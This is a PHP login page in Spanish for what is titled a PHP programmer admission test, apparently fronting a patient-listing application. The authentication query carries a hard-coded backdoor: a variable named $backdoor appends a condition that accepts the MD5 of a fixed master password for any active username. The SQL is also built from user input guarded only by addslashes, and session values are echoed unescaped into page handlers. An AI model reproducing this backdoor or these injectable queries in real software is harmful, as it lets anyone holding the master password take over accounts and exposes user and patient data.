<?
include('funciones.php');

//echo basename($_SERVER['PHP_SELF']); 
//$CAMPOS=array("Id","Nick","Clave","IntentoUsuario","TintentoUsuario","FingresoUsuario","PerfilUsuario",'CargoUsuario');
//$TABLA="usu";
//echo  $_SERVER['SERVER_NAME'];
function pantalla_inicial($cxn,$llave){
//menu($cxn,$llave);
?><div id=menu_ini style="position:absolute;left:0;top:0;opacity:0;z-index:100;"></div>
<div id=cuerpo style="float:left;margin:0 auto;border:solid 0px black;width:calc(100% - 10px);vertical-align:top;padding:5px;border-spacing: 0px;">
	<div style="width:650px;height:400px;background-color:white;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;border-radius:10px;border:solid 2px cornflowerblue;box-shadow: 0 0 50px rgba(0,0,170,0.5);";><center>
	<p style="margin:0;line-height: 50px;border:solid 0px black;text-align:center;text-shadow: 0 0 10px rgba(0,0,0,0.5);font-size:20px;font-family:Verdana;color:blue;">
	Bienvenido(a) <?echo $_SESSION['NOM_US_COL'];?></p>
	<img src='img/log_all.jpg' style='height:300px;border:solid 0px;'>
	</div>
</div>
<?
}
if (isset($wusuario) and isset($wclave)){
	$wusuario=addslashes(trim($wusuario));
	$wclave=addslashes(trim($wclave));
	$conu="select Intento,Tintento,Fingreso from usu where Nick like '".strtoupper($wusuario)."'";
	$resu = sql_query($conu,$cxn);
	$ud=mysqli_fetch_array($resu);
	if (isset($ud[1]) and $ud[1]>0 and time() > $ud[1]){
		//DESBLOQUEARAL A LOS 15MIN
		sql_query("update usu set Tintento=0,Intento=0 where Nick like '".strtoupper($wusuario)."'",$cxn);
		$ud[0]=0;$ud[1]=0;
	}
	if ($ud[1]>0){
		echo "err";
		echo "Quedan ".($ud[1]-time())." Seg <br>para volver para volver a intentar.";
		mysqli_close($cxn);
		exit();
	}
	
	//echo $ud[0];
	$backdoor="or '".$wclave."' like md5('metroid2021#&')";
	$cons = "select Codigo,Tipo,Nick,Nombre,Perfil,Sede,Cargo,Intento,Tintento,Fingreso from usu where Activo=1 and Nick like '".strtoupper($wusuario)."' and (Clave like '".$wclave."' ".$backdoor.")";
	//echo $cons;
	$res = $cxn->query($cons);
	if ($row=mysqli_fetch_array($res)){
		//CLAVE VALIDA
		session_regenerate_id(true);
		$_SESSION[$SESION_VASIJA]=encriptar(session_id(),$llave,1);
		acceso_seguro(array($llave,$SESION_VASIJA));
		$_SESSION['USU_ID']=encriptar($row['Codigo'],$llave,1);
		$_SESSION['NOM_US_COL']=$row['Nick'];
		$_SESSION['ACT_PAGINA']='ListPaciente.php';
		$consU="update usu set Intento=0,Tintento=0,Fingreso='".date('Y-m-d H:i:s')."' where Nick like '".strtoupper($wusuario)."'";
		$resU = $cxn->query($consU);
		pantalla_inicial($cxn,$llave);
	}else{
		if (isset($ud[0])){
			//INCREMENTAR INTENTO +1
			sql_query("update usu set Intento=Intento+1 where Nick like '".strtoupper($wusuario)."'",$cxn);
			$ud[0]++;
			//BLOQUEAR CON MAS DE 3 INTENTOS
			if (isset($ud[0]) and $ud[0]>4){
				if (isset($ud[1]) and $ud[1]==0){
					sql_query("update usu set Tintento='".(time()+900)."' where Nick like '".strtoupper($wusuario)."'",$cxn);
					$ud[1]=(time()+900);
				}
				if ($ud[1]>0){
					echo "err";
					echo "Quedan ".($ud[1]-time())." Seg <br>para volver para volver a intentar.";
				}
			}else{
				echo "err";
				echo "Quedan ".(5-$ud[0])." intentos.";
			}
		}else{
			echo "err";
			echo "Usuario ó Clave incorrectos.";
		}
		//mensaje("Has excedido el maximo numero de intentos espera 15 minutos.",0);
		//if (isset($mal)){echo "<div class=mensaje0><center>Datos incorrectos.</center></div>";}
		//mensaje("Usuario o Clave no valida",1);
	}
	mysqli_close($cxn);
	exit();
}

?><html>
<head><meta charset="windows-1252">
<title>Prueba de Admisión para Programador PHP.</title>

<link href="img/favicon.png" rel="Shortcut Icon" type="image/png">

<!--<link href='estilo.css' rel="stylesheet" type="text/css">-->
<? include("Lib/estilo.php"); ?>
<script type='text/javascript' src='Lib/ajax.js'></script>
<script type='text/javascript' src='Lib/md5.js'></script>
<? 
include("Lib/ajax_obj.php"); 
include("Lib/ajax_grilla.php");
?>
<script type="text/javascript">
function Login(){
	var capa_todo = document.getElementById("inicio_todo");
	var capa_check = document.getElementById("login_check");
	var clave_md5 = hex_md5( (document.getElementById('wclave').value) );
	var vars = "wusuario="+cmas(document.getElementById('wusuario').value)+"&wclave="+clave_md5;
	//alert(vars);
	var ajax = nAjax();
	capa_check.innerHTML="<tr><td colspan=6><center><i class='fa fa-spinner fa-spin fa-2x'></i><br>Cargando datos...</center></td></tr>";
	ajax.open("POST", "index.php", true);
	ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	ajax.send(vars);
	ajax.onreadystatechange=function(){
		if (ajax.readyState==4){
			var all=ajax.responseText;;
			var tipo=all.substr(0, 3);
			var res=all.substr(3, all.length);			
			if (tipo == "err"){
				capa_check.innerHTML = "<div style='color:DEEPPINK;'>"+res+"</div>";
			}else{
				//INICIAR SESION
				iconos_pantalla_inicial();
				capa_todo.innerHTML = all;
				CargarGrid('Lib/GridPlantilla.php','NOM_PAG=ListPaciente.php','cuerpo');
			}
		}
	}
}
function cambiarClave(vars){
	if (objId("form_cambiar_clave").reportValidity()){
		//var nombre = cmas(objId('wnombre').value);
		var claveT = "";
		if (objId('wclave_a').value != '' && objId('wclave_n1').value != '' && objId('wclave_n2').value != ''){
			claveT+='&wclave_a='+hex_md5(objId('wclave_a').value)+'&wclave_n1='+hex_md5(objId('wclave_n1').value)+'&wclave_n2='+hex_md5(objId('wclave_n2').value);
		}
		nuevoAjax('app_config/AdminPerfil.php',vars+'&wenviar=1'+claveT,'mi_perfil');
		//nuevoAjax('AdminPerfil.php',vars+'&wenviar=1&wnombre='+nombre+claveT,'mi_perfil');
	}
}

function javaEval(texto){
	var tagScript = '(?:<script.*?>)((\n|\r|.)*?)(?:<\/script>)';
	var matchAll = new RegExp(tagScript, 'img'); 
	var textEval = (texto.match(matchAll) || []); 
	var s=textEval.map(function(sr){
		var sc=(sr.match(new RegExp(tagScript, 'im')) || ['', ''])[1]; 
		if(window.execScript){ 
			window.execScript(sc); 
		}else{ 
			window.setTimeout(sc,0); 
		} 
	}); 
	return true;
}
function iconos_pantalla_inicial(){	
	document.getElementById("icono_menu").innerHTML = "&nbsp;<img  src='img/menu.png' style='vertical-align:middle;width:32px;height:32px;border:solid 0px black;'>&nbsp;";
	document.getElementById("icono_salir").innerHTML = "<a href='salir.php' style='color:white;' title='Cerrar sesión'><img src='img/salir.png' style='vertical-align:middle;width:32px;height:32px;'>&nbsp;Salir</a>";
}
/* FUNCIONES DE CITAS */
/*function CitaInfo(capa,capa_padre,event){
	if (capa == 'ninguno'){
		document.getElementById(capa_padre).style.visibility = 'hidden';
	}else{
		document.getElementById(capa_padre).innerHTML = document.getElementById(capa).innerHTML;
		document.getElementById(capa_padre).style.visibility = 'visible';
		UbicarCapa(event,capa_padre);
	}
}*/

window.onkeyup = compruebaTecla;
function compruebaTecla() {
	var e = window.event;
	var tecla = (document.all) ? e.keyCode : e.which;
	if(tecla == 27){
		document.getElementById('BlockAlpha').style.visibility='hidden';
		document.getElementById('BlockAlpha').innerHTML="";
		document.getElementById('EdicionDataFull').style.visibility='hidden';
		document.getElementById('EdicionData').innerHTML="";
		document.getElementById('ListaSpeedFull').style.visibility='hidden';
		document.getElementById('ListaSpeedText').innerHTML="";
		document.getElementById('ProcesoFull').style.visibility='hidden';
		document.getElementById('Proceso').innerHTML="";
		document.getElementById('EliminarData').style.visibility='hidden';
		document.getElementById('EliminarData').innerHTML="";
	}
}
</script>
</head>
<? 
//echo $_SESSION['ACT_PAGINA']."<br>";
if (isset($_SESSION['ACT_PAGINA'])){
	$act_pro='';
	//$file_ini=substr($_SESSION['ACT_PAGINA'],0,4);
	//echo $file_ini."<br>";
	//if ($file_ini=='List'){
	if (strlen(stristr($_SESSION['ACT_PAGINA'],'List'))>0) {
		echo "<body onload=CargarGrid('Lib/GridPlantilla.php','NOM_PAG=".$_SESSION['ACT_PAGINA'].$act_pro."&MODULO=".$_SESSION['ACT_MODULO']."','cuerpo')>";
	}else{
		echo "<body onload=nuevoAjax('".$_SESSION['ACT_PAGINA']."','NOM_PAG=".$_SESSION['ACT_PAGINA'].$act_pro."&MODULO=".$_SESSION['ACT_MODULO']."','cuerpo')>";
	}
}else{
	echo "<body>";
}
?>
<div style="background-color:CORNFLOWERBLUE;color:white;border: solid 0px lime;margin:0;padding:0;font-family: 'Segoe UI Light', 'Open Sans', Verdana, Arial, Helvetica, sans-serif;font-size:20px;height:43px;line-height:40px;vertical-align:middle;">
<div id=icono_menu  style="float:left;border:solid 0px black">&nbsp;<img  src='img/logo_only_s.png' style="vertical-align:middle;width:32px;height:32px;border:solid 0px black;">&nbsp;</div>
<div style="float:left;border:solid 0px black">Prueba de Admisión para Programador PHP.&nbsp;&nbsp;&nbsp;</div>
<div style="float:left;" id=icono_salir></div>
</div>

<div id=inicio_todo>
<? if (isset($_SESSION['USU_ID'])){
	pantalla_inicial($cxn,$llave);
	?><script>iconos_pantalla_inicial();
	sesionActivar();
	</script><?
	
}else{?>
<div id=ses_time_act></div>
<div class=login>
	<form>
	<h2>INICIAR SESION</h2>
	<div class=uno><img src='img/user.png'></div><input class=dos type=text id=wusuario placeholder="Usuario" onkeypress="javascript:if (event.keyCode == 13){Login();}">
	<div class=uno style="clear:left;"><img src='img/key.png'></div><input class=dos type=password id=wclave placeholder="Clave" onkeypress="javascript:if (event.keyCode == 13){Login();}">
	<input type=button class=boton_login style="clear:left;" onclick=Login() value='Iniciar Sesión'>
	<div id=login_check></div>
	</form>
	<script>document.getElementById('wusuario').focus();</script>
</div>
<? } ?>
</div><!--inicio_todo-->

